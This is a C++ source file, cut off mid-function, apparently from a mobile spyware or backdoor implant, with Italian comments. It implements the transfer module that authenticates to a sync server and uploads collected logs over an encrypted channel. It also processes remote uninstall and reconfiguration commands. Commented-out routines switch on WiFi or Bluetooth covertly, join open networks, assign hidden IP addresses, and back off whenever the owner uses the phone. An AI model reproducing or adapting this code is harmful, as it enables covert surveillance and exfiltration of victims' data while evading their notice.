#include <exception>
#include <wchar.h>
#include <memory>

using namespace std;

#include "Transfer.h"
#include "Status.h"
#include "Device.h"
#include "Log.h"
///#include "WindowsBlueTooth.h"
#include "Explorer.h"
#include "Buffer.h"
#include "Task.h"

///#include <common_new\Iphlpapi.h>
#include <common_new\wininet.h>

#include "FunctionFunc.h"

DEFINE_GUID(WIFI_DEVICE_GUID,   0x98c5250d, 0xc29a, 0x4985, 0xae, 0x5f, 0xaf, 0xe5, 0x36, 0x7e, 0x50, 0x06);
DEFINE_GUID(HMOBILE_PROTO_UUID, 0xa81fd4e0, 0xeec8, 0x4a1f, 0xbd, 0x6c, 0xb2, 0x49, 0x74, 0x57, 0x6b, 0xb9);

Transfer::Transfer() : bIsWifiActive(FALSE), bIsWifiAlreadyActive(FALSE), uBtMac(0), retryTimes(0), 
pollInterval(0), pSnap(NULL), uberlogObj(NULL), bNewConf(FALSE), bUninstall(FALSE), bWiFiForced(FALSE), 
uWifiKeyLen(0), ulRegistryDhcp(0), bGprsForced(FALSE), deviceObj(NULL) {


	WCHAR wifiGuid[]  = L"{98C5250D-C29A-4985-AE5F-AFE5367E5006}\\";

	// La porta di RSSM
	sPort = htons(80);

	strSessionCookie.clear();
	vAvailables.clear();

	statusObj = Status::self();
	uberlogObj = UberLog::self();
	deviceObj = Device::self();

	_RtlZeroMemory(BtPin, sizeof(BtPin));
	_RtlZeroMemory(&m_btGuid, sizeof(m_btGuid));
	_RtlZeroMemory(K, sizeof(K));

	//// Allochiamo la classe per la gestione dello stack BT
	//if (IsWidcomm()) {
	//	// Dummy class
	//	objBluetooth = new WindowsBlueTooth(HMOBILE_PROTO_UUID);
	//	DBG_TRACE(L"Debug - Transfer.cpp - Transfer() detected Widcomm Bluetooth Stack\n", 1, FALSE);
	//} else {
	//	objBluetooth = new WindowsBlueTooth(HMOBILE_PROTO_UUID);
	//	DBG_TRACE(L"Debug - Transfer.cpp - Transfer() detected Windows Bluetooth Stack\n", 1, FALSE);
	//}

	// Vediamo se tutti gli oggetti sono stati allocati
	if (statusObj == NULL || uberlogObj == NULL || deviceObj == NULL)
		return;

	// Impostiamo un intervallo di default
	SetPollInterval(3000, 5);
/***
	// Otteniamo il nome dell'adattore WiFi
	if (wifiObj.GetWiFiAdapterName(strWifiAdapter) == FALSE)
		return;
***/
	strWifiGuidName = wifiGuid;
	strWifiGuidName += strWifiAdapter;

	// A questo punto strWifiAdapter e strWifiGuidName sono valorizzati

}

Transfer::~Transfer() {
	/***
	delete objBluetooth;
***/
	ClearLogSnapshot();
	
}

BOOL Transfer::ActivateWiFi() {
	/***
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;

	if (strWifiAdapter.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - ActivateWiFi() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	// A questo punto abbiamo in wifiName la GUID ed il nome dell'adattatore,
	// in pBuf il nome dell'adattatore gia' NULL terminato
	powerState = deviceObj->GetDevicePowerState(strWifiGuidName);

	if (powerState == PwrDeviceUnspecified) {
		powerState = D4; // In caso di errore, supponiamo che sia spenta
	}

	if (bIsWifiAlreadyActive && powerState == D4) {
		bIsWifiAlreadyActive = FALSE;
		bIsWifiActive = FALSE;
	}

	// Conserviamo lo stato, lo utilizzeremo nella DeActivateWifi()
	wifiPower = powerState;

	switch (powerState) {
		case D0: // Full on
		case D1: // Low on
			bIsWifiAlreadyActive = TRUE;
			break;

		default:
			bIsWifiAlreadyActive = FALSE;
			deviceObj->SetDevicePowerState(strWifiGuidName, D0);

			powerState = deviceObj->GetDevicePowerState(strWifiGuidName);

			if (powerState == PwrDeviceUnspecified) {
				powerState = D4; // In caso di errore, supponiamo che sia spenta
			}
			break;
	}

	if (powerState == D4) {
		DBG_TRACE(L"Debug - Transfer.cpp - ActivateWiFi() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	Sleep(8000); // Attendiamo che il powerup sia completo
	bIsWifiActive = TRUE;
	DBG_TRACE(L"Debug - Transfer.cpp - ActivateWiFi() OK\n", 5, FALSE);
	***/
	return bIsWifiActive;
}

BOOL Transfer::DeActivateWiFi() {
	/***
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;

	if (strWifiAdapter.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - DeActivateWiFi() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	powerState = deviceObj->GetDevicePowerState(strWifiGuidName);

	if (powerState == PwrDeviceUnspecified) {
		powerState = D4; // In caso di errore, supponiamo che sia spenta
	}

	if (bIsWifiAlreadyActive) {
		// Se necessario restoriamo lo stato di alimentazione originale
		if(powerState != wifiPower) {
			deviceObj->SetDevicePowerState(strWifiGuidName, wifiPower);
		}

		DBG_TRACE(L"Debug - Transfer.cpp - DeActivateWiFi() OK\n", 5, FALSE);
		return TRUE;
	}

	if (powerState == D4) {
		deviceObj->SetDevicePowerState(strWifiGuidName, D4); // Proviamo comunque a spegnerla
		bIsWifiActive = FALSE;
		DBG_TRACE(L"Debug - Transfer.cpp - DeActivateWiFi() OK\n", 5, FALSE);
		return TRUE;
	}

	deviceObj->SetDevicePowerState(strWifiGuidName, D4);

	powerState = deviceObj->GetDevicePowerState(strWifiGuidName);

	if (powerState == PwrDeviceUnspecified) {
		powerState = D4; // In caso di errore, supponiamo che sia spenta
	}

	if (powerState != D4){
		bIsWifiActive = TRUE;
		DBG_TRACE(L"Debug - Transfer.cpp - DeActivateWiFi() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	bIsWifiActive = FALSE;
	DBG_TRACE(L"Debug - Transfer.cpp - DeActivateWiFi() OK\n", 5, FALSE);
	***/
	return TRUE;
}

BOOL Transfer::IsWiFiActive() {
	/***
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;

	if (strWifiAdapter.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiActive() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	powerState = deviceObj->GetDevicePowerState(strWifiGuidName);

	if (powerState == PwrDeviceUnspecified) {
		powerState = D4; // In caso di errore, supponiamo che sia spenta
	}

	if (powerState == D0 || powerState == D1) {
		DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiActive() OK\n", 5, FALSE);
		return TRUE;
	}

	DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiActive() [WiFi is Powered Off]\n", 5, FALSE);
	return FALSE;
}

BOOL Transfer::SetBTPin(UCHAR *pPin, UINT uLen) {
	if (pPin == NULL || uLen == 0 || uLen > 16)
		return FALSE;

	ZeroMemory(BtPin, 16);
	CopyMemory(BtPin, pPin, uLen);
	***/
	return TRUE;
}


BOOL Transfer::IsWiFiConnectionAvailable() {
/***
	PIP_ADAPTER_ADDRESSES pAdapterList;
	BYTE *pip = NULL;
	DWORD dwAdapterDim = sizeof(IP_ADAPTER_ADDRESSES) * 20, flags;

	if (IsWiFiActive() == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() [No WiFi Connection Available]\n", 5, FALSE);
		return FALSE;
	}

	pip = new(std::nothrow) BYTE[dwAdapterDim];

	if (pip == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() FAILED [0] ", 5, TRUE);
		return FALSE;
	}

	ZeroMemory(pip, dwAdapterDim);
	flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_FRIENDLY_NAME | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;

	if (GetAdaptersAddresses(AF_INET, flags, NULL, (PIP_ADAPTER_ADDRESSES)pip, &dwAdapterDim) != NO_ERROR) {
		delete[] pip;
		DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() FAILED [1] ", 5, TRUE);
		return FALSE;
	}

	// Possiamo anche usare la Transfer::GetAdapterIP() che e' parecchio piu' veloce
	for (pAdapterList = (PIP_ADAPTER_ADDRESSES)pip; pAdapterList != NULL; pAdapterList = pAdapterList->Next) {
		// Se e' il nostro adattatore WiFi ed ha un IP assegnato ritorna
		if (pAdapterList->AdapterName) {
			// Converti in widechar il nome dell'adapter
			WCHAR *wAdapter = new(std::nothrow) WCHAR[strlen(pAdapterList->AdapterName) + 1];

			if (wAdapter == NULL) {
				delete[] pip;
				DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() FAILED [2] ", 5, TRUE);
				return FALSE;
			}

			ZeroMemory(wAdapter, strlen(pAdapterList->AdapterName) + sizeof(WCHAR));
			wsprintf(wAdapter, L"%S", pAdapterList->AdapterName);

			if (strWifiAdapter == wAdapter && pAdapterList->OperStatus == IfOperStatusUp // && pAdapterList->FirstUnicastAddress) {
				delete[] wAdapter;
				delete[] pip;
				DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() OK\n", 5, FALSE);
				return TRUE;
			}

			delete[] wAdapter;
		}
	}

	delete[] pip;

	DBG_TRACE(L"Debug - Transfer.cpp - IsWiFiConnectionAvailable() FAILED [3]\n", 5, FALSE);
	***/
	return FALSE;
}

BOOL Transfer::SetBTMacAddress(UINT64 uMacAddress) {
	if (uMacAddress == 0)
		return FALSE;

	uBtMac = uMacAddress;

	return TRUE;
}

BOOL Transfer::SetBTGuid(GUID gGuid) {
	m_btGuid = gGuid;

	return TRUE;
}

// pSsid dovrebbe essere  in CHAR perche' kiodo ce lo passa come ASCII
BOOL Transfer::SetWifiSSID(WCHAR* pSSID, UINT uLen) {
	
	CHAR cSsid[33];

	if (pSSID == NULL || uLen == 0)
		return FALSE;

	_RtlZeroMemory(wSsid, sizeof(wSsid));
	_RtlZeroMemory(cSsid, sizeof(cSsid));
	_RtlCopyMemory(cSsid, (CHAR *)pSSID, 32);
	swprintf_s(wSsid, L"%S", cSsid);
	//CopyMemory(wSsid, pSSID, uLen);

	return TRUE;
}

BOOL Transfer::SetWifiKey(BYTE* pKey, UINT uLen) {
	
	if (pKey == NULL)
		return FALSE;

	// Teniamo traccia della lunghezza della chiave
	uWifiKeyLen = uLen;

	_RtlZeroMemory(wifiKey, sizeof(wifiKey));
	_RtlCopyMemory(wifiKey, pKey, uLen);

	return TRUE;
}

BOOL Transfer::IsWidcomm() {
	/***
	HKEY hWidcomm;
	HINSTANCE hInst;
	LONG lRet;

	// Questa chiave _dovrebbe_ esser presente sui telefoni che usano lo stack Widcomm.
	// Alternativamente si puo' checkare la presenza di questi file:
	// ("\Windows\BtSdkCE30.dll" || "\Windows\BtSdkCE50.dll") && "\Windows\BtCoreIf.dll"
	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\WIDCOMM", 0, 0, &hWidcomm);

	RegCloseKey(hWidcomm);

	if (lRet == ERROR_SUCCESS)
		return TRUE;

	hInst = LoadLibrary(L"BtSdkCE50.dll");

	if (hInst != NULL) {
		FreeLibrary(hInst);
		return TRUE;
	}

	hInst = LoadLibrary(L"BtSdkCE30.dll");

	if (hInst != NULL) {
		FreeLibrary(hInst);
		return TRUE;
	}
	***/
	return FALSE;
}

BOOL Transfer::BtSend() {
	/*WSADATA wsd;
	list<ConfStruct>::const_iterator iter;
	SOCKADDR_BTH sab;
	BTH_SOCKOPT_SECURITY bss;
	UINT poll, times, i;
	INT ret;

	ZeroMemory(&sab, sizeof(SOCKADDR_BTH));
	ZeroMemory(&bss, sizeof(BTH_SOCKOPT_SECURITY));

	WAIT_AND_SIGNAL(statusObj->hConfigLock);
	for (iter = statusObj->GetConfigStruct().begin(); iter != statusObj->GetConfigStruct().end(); iter++) {
		switch ((*iter).uConfId) {
			case CONFIGURATION_BTMAC: 
				SetBTMacAddress(*(BT_ADDR *)((*iter).pParams));
				break;

			case CONFIGURATION_BTPIN:
				SetBTPin((UCHAR *)((*iter).pParams), (*iter).uParamLength);
				break;

			case CONFIGURATION_CONNRETRY:
				poll = *(UINT *)((*iter).pParams);
				times = *(UINT *)((BYTE *)(*iter).pParams + 4);
				SetPollInterval(poll, times);
				break;

			case CONFIGURATION_BTGUID:
				SetBTGuid(*(GUID *)((*iter).pParams));
				break;

			// L'SSID della rete WiFi ed il nome del device BT sono gli stessi
			case CONFIGURATION_WIFISSID:
				SetWifiSSID((WCHAR *)((*iter).pParams), (*iter).uParamLength);
				break;

			default: break;
		}
	}
	UNLOCK(statusObj->hConfigLock);

	objBluetooth->SetInstanceName(wSsid);
	objBluetooth->SetGuid(m_btGuid);

	if (WSAStartup(MAKEWORD(1,0),&wsd) != 0) {
		DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [1]\n", 3, FALSE);
		return FALSE;
	}

	if (objBluetooth->ActivateBT() == FALSE) {
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [2]\n", 3, FALSE);
		return FALSE;
	}

	BTSocket = socket(AF_BTH, SOCK_STREAM, BTHPROTO_RFCOMM);

	if (BTSocket == INVALID_SOCKET) {
		objBluetooth->DeActivateBT();
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [3]\n", 3, FALSE);
		return FALSE;
	}

	// Find loop
	i = 0;
	while (i < retryTimes) {
		// La FindServer() si interrompe automaticamente se l'utente utilizza il telefono
		uBtMac = objBluetooth->FindServer(BTSocket);

		if (uBtMac == 0) {
			Sleep(pollInterval);
			i++;
			DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FindServer() returned 0, sleeping...\n", 4, FALSE);
			continue;
		}

		break;
	}

	if (uBtMac == 0) { 
		objBluetooth->DeActivateBT();
		closesocket(BTSocket);
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [4]\n", 3, FALSE);
		return FALSE;
	}

	sab.btAddr = uBtMac;
	sab.addressFamily = AF_BTH;
	sab.port = 0;
	sab.serviceClassId = m_btGuid;
	bss.btAddr = uBtMac;
	bss.iLength = strlen((CHAR *)BtPin);
	CopyMemory((CHAR *)bss.caData, (CHAR *)BtPin, strlen((CHAR *)BtPin));

	if (strlen((CHAR *)BtPin)) {
		if (setsockopt(BTSocket, SOL_RFCOMM, SO_BTH_SET_PIN , (CHAR *)&bss, sizeof(bss)) == SOCKET_ERROR) {
			objBluetooth->DeActivateBT();
			closesocket(BTSocket);
			WSACleanup();
			DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [5]\n", 3, FALSE);
			return FALSE;
		}

		INT encryption = TRUE;
		if (setsockopt(BTSocket, SOL_RFCOMM, SO_BTH_ENCRYPT , (CHAR *)&encryption, sizeof(encryption)) == SOCKET_ERROR) {
			objBluetooth->DeActivateBT();
			closesocket(BTSocket);
			WSACleanup();
			DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [5]\n", 3, FALSE);
			return FALSE;
		}
	}

	// Connect loop
	i = 0;
	while (i < retryTimes) {
		ret = connect(BTSocket, (const sockaddr *)&sab, sizeof(sab));

#ifdef _DEBUG
		int conn_err = WSAGetLastError();
#endif

		if (ret) {
			// Usciamo dal loop se l'utente riprende ad interagire col telefono
			if (deviceObj->IsDeviceUnattended() == FALSE || (statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
				objBluetooth->DeActivateBT();
				closesocket(BTSocket);
				WSACleanup();
				DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [Power status or crisis changed] [6]\n", 3, FALSE);
				return FALSE;
			}

			Sleep(pollInterval);
			i++;
			continue;
		}

		break;
	}

	// Non si riesce a connettere, torniamo con un errore
	if (ret) {
		objBluetooth->DeActivateBT();
		closesocket(BTSocket);
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [7]\n", 3, FALSE);
		return FALSE;
	}

	// Send loop
	i = 0;
	while (i < retryTimes) {
		if (SendOldProto(CONF_SYNC_BT, TRUE) == TRUE) {
			objBluetooth->DeActivateBT();
			closesocket(BTSocket);
			WSACleanup();

			DBG_TRACE(L"Debug - Transfer.cpp - BtSend() -> Send() OK\n", 3, FALSE);

			if (bUninstall)
				return SEND_UNINSTALL;

			if (bNewConf)
				return SEND_RELOAD;

			return TRUE;
		} else {
			// Usciamo dal loop se l'utente riprende ad interagire col telefono
			if (deviceObj->IsDeviceUnattended() == FALSE || (statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC)
				break;

			Sleep(pollInterval);
			i++;
			continue;
		}
	}

	objBluetooth->DeActivateBT();
	closesocket(BTSocket);
	WSACleanup();

	// Se abbiamo una nuova conf torniamo comunque con un reload
	DBG_TRACE(L"Debug - Transfer.cpp - BtSend() FAILED [8]\n", 3, FALSE);

	if (bNewConf)
		return SEND_RELOAD;
*/
	return FALSE;
}

// Forza una connessione ad una rete WiFi provando ad ottenere un IP tramite
// DHCP per effettuare la sync verso il server internet.
BOOL Transfer::ForceWiFiConnection() {
	/***
	struct BSSIDInfo bssid;

	// Abbiamo forzato una connessione che ancora non e' stata rilasciata
	if (bWiFiForced) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() FAILED [Connection not released yet!] [0]\n", 4, FALSE);
		return FALSE;
	}

	ZeroMemory(&bssid, sizeof(bssid));

	// Se siamo gia' connessi non possiamo forzare il cambio di connessione
	if (IsWiFiConnectionAvailable()) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() FAILED [Already connected!] [1]\n", 4, FALSE);
		bWiFiForced = FALSE;
		return FALSE;
	}

	if (ActivateWiFi() == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() FAILED [2]\n", 4, FALSE);
		bWiFiForced = FALSE;
		return FALSE;
	}

	// Connettiamoci ad una rete preferita, se presente
	if (wifiObj.WZCConnectToPreferred(strWifiAdapter)) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() [Connected to preferred] OK\n", 5, FALSE);
		bWiFiForced = TRUE;
		return TRUE;
	}

	// Connettiamoci ad una rete aperta
	if (wifiObj.WZCConnectToOpen(strWifiAdapter)) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() [Connected to open] OK\n", 5, FALSE);
		bWiFiForced = TRUE;
		return TRUE;
	}
	***/
	/*
	// Prendiamo gli attuali mask e ip
	ulOriginalIp = GetAdapterIP(strWifiAdapter);
	ulOriginalMask = GetAdapterMask(strWifiAdapter);

	// Cerchiamo la nostra rete
	if(wifiObj.GetBSSID(strWifiAdapter, L"nobody", &bssid) == FALSE)
	return FALSE;

	// Disassociamoci da qualunque rete preconfigurata... Giusto per sicurezza
	if(wifiObj.Disassociate(strWifiAdapter) == FALSE)
	return FALSE;

	// Colleghiamoci alla nuova rete
	if(wifiObj.WZCConfigureNetwork(strWifiAdapter, &bssid, (BYTE *)&WepKey, 5) == FALSE)
	return FALSE;

	// Diamo alla backdoor il tempo di associarsi
	Sleep(8000);

	// Impostiamo il nostro nuovo ip/mask (198.18.0.0 - 198.19.255.255 	198.18.0.0/15)
	// Il server e' .106
	DWORD dwNewIp = (DWORD)inet_addr("198.18.211.105");
	DWORD dwNewMask = (DWORD)inet_addr("255.255.255.0");
	DWORD Index = GetAdapterIndex(strWifiAdapter);

	// Aggiungiamo il nostro IP
	if(AddIPAddress(dwNewIp, dwNewMask, Index, &NTEContext, &NTEInstance) != NO_ERROR)
	return FALSE;
	*/
	/***
	DeActivateWiFi();
	bWiFiForced = FALSE;
	DBG_TRACE(L"Debug - Transfer.cpp - ForceWiFiConnection() FAILED [3]\n", 4, FALSE);
	***/
	return FALSE;
}

BOOL Transfer::ForceGprsConnection() {
	/***
	if (bGprsForced) {
		DBG_TRACE(L"Debug - Transfer.cpp - ForceGprsConnection() [Already forced!] FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	gprsObj.Connect();

	bGprsForced = TRUE;
	DBG_TRACE(L"Debug - Transfer.cpp - ForceGprsConnection() OK\n", 5, FALSE);
	***/
	return TRUE;
}

BOOL Transfer::ReleaseWiFiConnection() {
/***
	if (bWiFiForced == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - ReleaseWiFiConnection() FAILED [No forced connection present] [0]\n", 4, FALSE);
		return FALSE;
	}

	//if(wifiObj.Disassociate(strWifiAdapter) == FALSE)
	//	return FALSE;

	// Rimuoviamo l'IP che avevamo aggiunto
	//if(DeleteIPAddress(NTEContext) != NO_ERROR)
	//	return FALSE;

	if (DeActivateWiFi() == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - ReleaseWiFiConnection() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	bWiFiForced = FALSE;
	DBG_TRACE(L"Debug - Transfer.cpp - ReleaseWiFiConnection() OK\n", 5, FALSE);
***/
	return TRUE;
}

BOOL Transfer::ReleaseGprsConnection() {
	/***
	if (bGprsForced == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - ReleaseGprsConnection() FAILED [No forced connection present] [0]\n", 4, FALSE);
		return FALSE;
	}

	gprsObj.Disconnect();

	bGprsForced = FALSE;
	DBG_TRACE(L"Debug - Transfer.cpp - ReleaseGprsConnection() OK\n", 5, FALSE);
	***/
	return TRUE;
}

UINT Transfer::WiFiSendPda() {
/*	WSADATA wsd;
	list<ConfStruct>::const_iterator iter;
	sockaddr_in saw;
	struct BSSIDInfo bssid;	
	ULONG dwNewIp, dwNewMask;
	DWORD Index = GetAdapterIndex(strWifiAdapter);
	ULONG lLocalContext = 0, lLocalInstance = 0;
	UINT poll, times, i;
	INT ret;

	if (statusObj == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	ZeroMemory(&saw, sizeof(saw));
	ZeroMemory(&bssid, sizeof(bssid));

	// Impostiamo il nostro nuovo ip/mask (198.18.0.0 - 198.19.255.255 	198.18.0.0/15)
	// Il server e' .210, la porta e' 6859
	dwNewIp = inet_addr("169.254.171.209");
	dwNewMask = inet_addr("255.255.0.0");
	//sPort = htons(81); // Porta del server di sync

	WAIT_AND_SIGNAL(statusObj->hConfigLock);
	for(iter = statusObj->GetConfigStruct().begin(); iter != statusObj->GetConfigStruct().end(); iter++){
		switch((*iter).uConfId){
			case CONFIGURATION_WIFIIP: // Per ora lo impostiamo noi
				//SetWiFiIp(*(BT_ADDR *)((*iter).pParams));
				break;

			case CONFIGURATION_WIFIENC: // Per ora solo trasmettiamo in chiaro
				//SetWiFiEncryption((UCHAR *)((*iter).pParams), (*iter).uParamLength);
				break;

			case CONFIGURATION_CONNRETRY:
				poll = *(UINT *)((*iter).pParams);
				times = *(UINT *)((BYTE *)(*iter).pParams + 4);
				SetPollInterval(poll, times);
				break;

			case CONFIGURATION_WIFIKEY:
				SetWifiKey((BYTE *)((*iter).pParams), (*iter).uParamLength);
				break;

			case CONFIGURATION_WIFISSID:
				SetWifiSSID((WCHAR *)((*iter).pParams), (*iter).uParamLength);
				break;

			default: break;
		}
	}
	UNLOCK(statusObj->hConfigLock);

	if (SetWirelessIp(strWifiAdapter, dwNewIp, dwNewMask) == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	// Serve a flushare i settings della scheda
	ActivateWiFi();
	DeActivateWiFi();

	if (WSAStartup(MAKEWORD(1,0), &wsd) != 0) {
		RestoreWirelessIp(strWifiAdapter);
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	if (ActivateWiFi() == FALSE) {
		RestoreWirelessIp(strWifiAdapter);
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [3]\n", 4, FALSE);
		return FALSE;
	}

	//Sleep(6000);

	wifiSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (wifiSocket == INVALID_SOCKET) {
		DeActivateWiFi();
		RestoreWirelessIp(strWifiAdapter);
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [4]\n", 4, FALSE);
		return FALSE;
	}

	// Cerchiamo la nostra rete
	if (wifiObj.GetBSSID(strWifiAdapter, wSsid, &bssid) == FALSE) {
		CopyMemory(&bssid.SSID, wSsid, WideLen(wSsid));
	}

	//Sleep(3000);

	// Colleghiamoci alla nuova rete
	if (wifiObj.WZCConfigureNetwork(strWifiAdapter, &bssid, wifiKey, uWifiKeyLen) == FALSE) {
		WSACleanup();
		DeActivateWiFi();
		RestoreWirelessIp(strWifiAdapter);
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [5]\n", 4, FALSE);
		return FALSE;
	}

	// Diamo alla backdoor il tempo di associarsi
	Sleep(10000);

	saw.sin_family = AF_INET;
	saw.sin_addr.s_addr = inet_addr("169.254.171.210"); // Il server e' il nostro IP + 1
	saw.sin_port = sPort;

	// Connect loop
	i = 0;
	while (i < retryTimes) {
		ret = connect(wifiSocket, (const sockaddr *)&saw, sizeof(saw));

		if (ret) {
#ifdef _DEBUG
			int conn_err = GetLastError();
#endif
			Sleep(pollInterval);
			i++;
			continue;
		}

		break;
	}

	// Non si riesce a connettere, torniamo con un errore
	if (ret) {
		DeActivateWiFi();
		RestoreWirelessIp(strWifiAdapter);
		closesocket(wifiSocket);
		WSACleanup();
		DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [6] ", 4, TRUE);
		return FALSE;
	}

	// Send loop
	i = 0;
	while (i < retryTimes) {
		if (Send(CONF_SYNC_WIFI, FALSE) == TRUE) {
			DeActivateWiFi();
			RestoreWirelessIp(strWifiAdapter);
			closesocket(wifiSocket);
			WSACleanup();

			if (bUninstall)
				return SEND_UNINSTALL;

			if (bNewConf)
				return SEND_RELOAD;

			DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() OK\n", 5, FALSE);
			return TRUE;
		} else {
			Sleep(pollInterval);
			i++;
			continue;
		}
	}

	DeActivateWiFi();
	RestoreWirelessIp(strWifiAdapter);
	closesocket(wifiSocket);
	WSACleanup();

	DBG_TRACE(L"Debug - Transfer.cpp - WiFiSendPda() FAILED [7] ", 4, TRUE);

	// Se abbiamo una nuova conf torniamo comunque con un reload
	if (bNewConf)
		return SEND_RELOAD;
*/
	return FALSE;
}

INT Transfer::InternetSend(const wstring &strHostname) {
	
	if (strHostname.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() FAILED [0]\n", 4, FALSE);
		return SEND_FAIL;
	}

	bUninstall = bNewConf = FALSE;

	strSyncServer = strHostname;

	// Connect loop
	UINT i = 0;

	while (i < retryTimes) {
		// Autentichiamoci
		UINT uCode = RestAuth();

		switch (uCode) {
			case PROTO_OK: // Procediamo con la sync
				break;

			case PROTO_NO: // Siamo stati messi in coda
				return FALSE;

			case PROTO_UNINSTALL: // Ci dobbiamo uninstallare
				return SEND_UNINSTALL;

			default:
				DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestAuth() connection attempt FAILED]: ", 4, TRUE);
				_Sleep(pollInterval);
				i++;
				continue;
		}

		// Procediamo con l'identification
		if (RestIdentification() == FALSE) {
			UINT uCommand = PROTO_BYE, uResponse = 0;
			RestSendCommand((PBYTE)&uCommand, sizeof(uCommand), uResponse);

			DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestIdentification() FAILED]: ", 4, TRUE);
			return SEND_FAIL;
		}

		// Parsiamo le richieste ricevute dal server
		RestProcessAvailables();

		// Inviamo i log
		if (RestSendLogs() == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestSendLogs() FAILED]: ", 4, TRUE);
		}

		// Spediamo un PROTO_BYE
		BYTE sha1[20];

		UINT uCommand = PROTO_BYE, uResponse = 0;
		UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_BYE) + 20);

		Buffer b(Encryption::GetPKCS5Padding(sizeof(PROTO_BYE) + 20));
		Hash hash;

		hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

		// Creiamo il request per il comando
		b.append((UCHAR *)&uCommand, sizeof(uCommand));
		b.append((BYTE *)sha1, 20);
		b.repeat(uPadding, uPadding);

		PBYTE pResp = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

		if (pResp)
			delete[] pResp;

		if (bUninstall)
			return SEND_UNINSTALL;

		if (bNewConf)
			return SEND_RELOAD;

		return SEND_OK;
	}

	return SEND_FAIL;
}

BYTE* Transfer::RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uResponseLen) {
	
	Encryption encK(K, 128);
	PBYTE pServResponse = NULL, pClientCommand = NULL;

	if (pCommand == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendCommand() FAILED [pCommand == NULL]\n", 4, TRUE);
		return NULL;
	}

	pClientCommand = encK.EncryptData(pCommand, &uCommandLen);

	if (RestPostRequest(pClientCommand, uCommandLen, pServResponse, uResponseLen) == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendCommand() FAILED\n", 4, TRUE);
		return NULL;
	}

	delete[] pClientCommand;

	// Decifra il response del server
	PBYTE pClearRequest = NULL;

	pClearRequest = encK.DecryptData(pServResponse, &uResponseLen);

	delete[] pServResponse;

	// Rimuovi il padding
	uResponseLen -= (BYTE)pClearRequest[uResponseLen - 1];

	// Se il response e' stranamente grande, c'e' un problema...
	if (uResponseLen > 100 * 1024 * 1024 || uResponseLen < 20) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendCommand() FAILED [Decryption failed]\n", 4, TRUE);
		delete[] pClearRequest;
		return NULL;
	}

	// Verifica l'integrita' del messaggio
	Buffer c(20);
	Hash hash;

	BYTE sha1[20];

	// Se il response e' stranamente grande, c'e' un problema...
